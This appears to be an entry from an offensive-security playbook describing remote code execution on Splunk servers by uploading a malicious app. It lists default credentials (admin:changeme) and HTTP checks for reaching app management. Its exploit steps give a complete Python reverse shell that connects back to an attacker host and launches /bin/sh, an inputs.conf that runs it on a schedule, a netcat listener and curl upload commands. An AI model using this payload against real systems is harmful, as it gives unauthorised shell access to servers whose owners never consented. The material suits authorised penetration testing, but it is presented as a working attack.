techniques.title: Splunk app upload with scripted input → RCE
preconditions: free license (remote 8089 login disabled) OR usable web creds (default admin:changeme, or no-auth)
techniques.notes: Free license disables remote login on the 8089 management port but the web app-upload on 8000 still works. A custom app with a scripted input (inputs.conf [script://...]) runs code as the 'splunk' OS user. Default credential is admin:changeme.

validate_commands.desc: default/supplied creds log in and app management is reachable
license mode (free => upload via web 8000 only)

validate_steps: GET http://{target}:8000/en-US/account/login — 200 means the web UI is reachable.
GET http://{target}:8000/en-US/manager/launcher/apps/local with creds — 200 means login + app management work.
exploit_steps:
cat > splunk_shell/bin/rev.py << 'PYEOF'
import socket,subprocess,os
s=socket.socket()
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
PYEOF
chmod +x splunk_shell/bin/rev.py

cat > splunk_shell/default/inputs.conf << 'CONFEOF'
[script://./bin/rev.py]
disabled = false
interval = {interval}
sourcetype = shell
CONFEOF
rlwrap -cAr nc -lvnp {lport}   # listener on your Kali box ({lhost})

Upload the app — free license: web UI only (http://{target}:8000/en-US/manager/launcher/apps/local → 'Install app from file', or POST to /en-US/manager/appinstall/_upload with a session cookie). Enterprise license: REST also works — curl -k -u {user}:{pass} https://{target}:8089/services/apps/local -d name=splunk_shell --data-urlencode filename=@splunk_shell.tar.gz
The scripted input runs within ~{interval}s and the shell returns to your listener as the 'splunk' user.
